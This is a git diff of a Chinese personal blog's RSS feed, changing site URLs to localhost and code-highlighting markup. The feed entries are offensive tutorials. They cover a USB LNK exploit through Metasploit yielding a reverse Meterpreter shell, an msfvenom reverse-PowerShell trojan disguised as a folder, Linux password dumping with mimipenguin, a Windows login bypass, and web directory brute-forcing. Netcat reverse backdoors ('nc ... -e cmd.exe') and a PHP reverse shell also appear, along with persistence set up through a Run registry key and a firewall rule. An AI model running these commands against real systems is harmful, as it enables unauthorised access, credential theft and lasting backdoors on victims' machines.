@@ -4,8 +4,8 @@
         <title></title>  
         <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
 </description>  
-        <link>http://www.vinny.cc</link>  
-        <atom:link href="http://www.vinny.cc/feed.xml" rel="self" type="application/rss+xml" />  
+        <link>http://localhost:4000</link>  
+        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
           
             <item>  
                <title>通过U盘使用Link漏洞进行攻击</title>  
@@ -28,27 +28,25 @@
 
 &lt;p&gt;从 &lt;strong&gt;&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;exploit-db&lt;/a&gt;&lt;/strong&gt; 下载 &lt;strong&gt;LNK Remote Code Execution Vulnerability&lt;/strong&gt; 漏洞文件&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://www.exploit-db.com/download/42382.rb
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://www.exploit-db.com/download/42382.rb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/h2&gt;
 
 &lt;p&gt;安装漏洞脚本很简单，只需要将下载的ruby漏洞脚本文件放到metasploit指定目录中即可&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp 42382.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;42382.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; search 42382
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; use exploit/windows/fileformat/42382
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp &lt;span class=&quot;c&quot;&gt;# 注意目标是x86还是x64的&lt;/span&gt;
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.1.15
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; show targets
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;target 0
-msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; exploit
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search 42382
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/fileformat/42382
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp &lt;span class=&quot;c&quot;&gt;# 注意目标是x86还是x64的&lt;/span&gt;
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.1.15
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show targets
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;target 0
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/lLbLLlpJEWOCVjXn.dll created copy it to the root folder of the target USB drive
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/attUBiQoEENCHdXj_D.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is D
@@ -75,8 +73,7 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/FTLzXgWfeTeMuieN_Y.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Y
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/JKYOcCLPNuxnHvlh_Z.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Z
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;执行上述metasploit命令后会在本地启动好监听程序，&lt;strong&gt;并在~/.msf4/local中生成多个link文件&lt;/strong&gt;&lt;/p&gt;
 
@@ -89,8 +86,8 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 &lt;p&gt;将U盘插入目标windows机器中，打开U盘就会出发远程link漏洞，在Metasploit控制台中得到目标主机的shell&lt;/p&gt;
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-link-remote-vulnerability/</guid>  
+               <link>http://localhost:4000/2017/11/u-link-remote-vulnerability/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/u-link-remote-vulnerability/</guid>  
                </item>  
           
             <item>  
@@ -111,9 +108,8 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 
 &lt;h2 id=&quot;1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p cmd/windows/reverse_powershell &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.15 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;43221  &amp;gt; file.bat
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p cmd/windows/reverse_powershell &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.15 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;43221  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.bat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/h2&gt;
 
@@ -130,8 +126,8 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 &lt;p&gt;此时U盘中只会看见一个”18++”的”文件夹”，其实是伪装的脚本木马程序。&lt;/p&gt;
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/u-fake-attacker/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-fake-attacker/</guid>  
+               <link>http://localhost:4000/2017/11/u-fake-attacker/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/u-fake-attacker/</guid>  
                </item>  
           
             <item>  
@@ -155,27 +151,25 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
 
 &lt;h2 id=&quot;3-下载&quot;&gt;3. 下载&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/huntergregal/mimipenguin.git
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/huntergregal/mimipenguin.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;4-使用&quot;&gt;4. 使用&lt;/h2&gt;
 
 &lt;p&gt;在目标机器直接运行&lt;code class=&quot;highlighter-rouge&quot;&gt;mimipenguin&lt;/code&gt;命令，如下：&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# shell&lt;/span&gt;
-chmod u+x mimipenguin.py
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# shell&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+x mimipenguin.py
 ./mimipenguin.sh
 
 &lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
 python3 ./mimipenguin.py
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/dump-password-linux/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/dump-password-linux/</guid>  
+               <link>http://localhost:4000/2017/11/dump-password-linux/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/dump-password-linux/</guid>  
                </item>  
           
             <item>  
@@ -268,8 +262,8 @@ python3 ./mimipenguin.py
 &lt;p&gt;在windows登录界面右下角，点击辅助程序即可打开windows命令行程序，使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;net user&lt;/code&gt;查看当前用户，&lt;code class=&quot;highlighter-rouge&quot;&gt;net user vinny *&lt;/code&gt;创建一个不带密码的用户，重启即可进入。&lt;/p&gt;
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/crack-windows-password/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/crack-windows-password/</guid>  
+               <link>http://localhost:4000/2017/11/crack-windows-password/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/crack-windows-password/</guid>  
                </item>  
           
             <item>  
@@ -290,9 +284,8 @@ python3 ./mimipenguin.py
 
 &lt;h2 id=&quot;1-dirb&quot;&gt;1. dirb&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir http://xxx.xxx.xxx
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir &lt;/span&gt;http://xxx.xxx.xxx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;词典路径 /usr/share/dirb/wordlists&lt;/p&gt;
@@ -300,28 +293,25 @@ python3 ./mimipenguin.py
 
 &lt;h2 id=&quot;2-dirbuster&quot;&gt;2. dirbuster&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirbuster
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirbuster
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;blockquote&gt;
   &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dirbuster&lt;/code&gt;是图形化的界面，默认词典路径 /usr/share/dirbuster/wordlists&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;h2 id=&quot;3-metasploit&quot;&gt;3. metasploit&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/http/dir_scanner
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/http/dir_scanner
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;4-dirsearch&quot;&gt;4. dirsearch&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/maurosoria/dirsearch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/maurosoria/dirsearch
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/brute-crack-dir-in-web/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/brute-crack-dir-in-web/</guid>  
+               <link>http://localhost:4000/2017/11/brute-crack-dir-in-web/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/brute-crack-dir-in-web/</guid>  
                </item>  
           
             <item>  
@@ -352,39 +342,35 @@ python3 ./mimipenguin.py
 
 &lt;h3 id=&quot;11-聊天工具&quot;&gt;1.1 聊天工具&lt;/h3&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 服务端&lt;/span&gt;
-nc -lvp 5678
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 服务端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
 &lt;span class=&quot;c&quot;&gt;# 客户端&lt;/span&gt;
 nc 192.168.1.15 5678
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;12-文件传输&quot;&gt;1.2 文件传输&lt;/h3&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 接收端&lt;/span&gt;
-nc -lvp 5555 &amp;gt; a.zip
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 接收端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5555 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; a.zip
 &lt;span class=&quot;c&quot;&gt;# 发送端&lt;/span&gt;
 nc 192.168.1.5 5678 &amp;lt; cms.zip
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;13-反向后门&quot;&gt;1.3 反向后门&lt;/h3&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 监听端&lt;/span&gt;
-nc -lvp 5678
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 监听端&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
 &lt;span class=&quot;c&quot;&gt;# 控制端&lt;/span&gt;
-nc 192.168.1.5 5678 -e cmd.exe
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+nc 192.168.1.5 5678 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;2-综合使用&quot;&gt;2. 综合使用&lt;/h2&gt;
 
 &lt;h3 id=&quot;21-结合php反向后门&quot;&gt;2.1 结合php反向后门&lt;/h3&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 控制端启动监听&lt;/span&gt;
-nc -lvp 1234
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 控制端启动监听&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;编辑php反弹shell后门，&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;，修改 &lt;strong&gt;$ip&lt;/strong&gt; 和 &lt;strong&gt;$port&lt;/strong&gt; 为控制端的地址和端口
 将 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件上传至目标服务器中，通过浏览器触发 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件路径，在nc终端中的到反弹shell&lt;/p&gt;
@@ -393,43 +379,40 @@ nc -lvp 1234
 
 &lt;p&gt;&lt;strong&gt;windows/shell_hidden_bind_tcp&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_hidden_bind_tcp &lt;span class=&quot;nv&quot;&gt;ahost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 –f exe &amp;gt; root.exe
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_hidden_bind_tcp &lt;span class=&quot;nv&quot;&gt;ahost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
 nc 192.168.0.103 4444
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;windows/shell_reverse_tcp&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_reverse_tcp  &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8888 –f exe &amp;gt; root.exe
-nc -lvp 8888
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_reverse_tcp  &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8888 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
+nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;23-做持久化后门使用&quot;&gt;2.3 做持久化后门使用&lt;/h3&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 将nc.exe上传至目标服务器中指定目录&lt;/span&gt;
-msf &amp;gt; upload /usr/share/windows-binaries/nc.exe C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;system32
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 将nc.exe上传至目标服务器中指定目录&lt;/span&gt;
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; upload /usr/share/windows-binaries/nc.exe C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;system32
 
 &lt;span class=&quot;c&quot;&gt;# 切换到目标cmd环境&lt;/span&gt;
-msf &amp;gt; shell
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
 
 &lt;span class=&quot;c&quot;&gt;# 添加自启动注册表项&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;C:\WINDOWS&amp;gt; &lt;/span&gt;reg setval -k HKLM&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;software&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;microsoft&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;currentversion&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;run -v netcat -d &lt;span class=&quot;s1&quot;&gt;'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; reg setval &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; HKLM&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;software&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;microsoft&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;currentversion&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; netcat &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# 添加nc出入站防火墙规则&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;C:\WINDOWS&amp;gt; &lt;/span&gt;netsh advfirewall firewall add rule &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'netcat'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;allow &lt;span class=&quot;nv&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Tcp &lt;span class=&quot;nv&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4445
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh advfirewall firewall add rule &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'netcat'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;allow &lt;span class=&quot;nv&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Tcp &lt;span class=&quot;nv&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4445
 
 &lt;span class=&quot;c&quot;&gt;# 检查nc防火墙是否已经开放&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;C:\WINDOWS&amp;gt; &lt;/span&gt;netsh firewall show portopening
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh firewall show portopening
 
